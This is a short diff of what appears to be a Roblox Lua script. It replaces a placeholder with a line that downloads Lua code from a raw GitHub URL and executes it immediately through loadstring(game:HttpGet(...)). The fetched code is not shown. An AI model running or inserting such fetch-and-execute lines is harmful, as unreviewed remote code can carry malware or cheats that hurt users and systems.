@@ -1,4 +1,4 @@
 
 
 
-loadstring(game:HttpGet("gggg"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LORLN9/Span-lorln/refs/heads/main/Lorln%20anit"))()
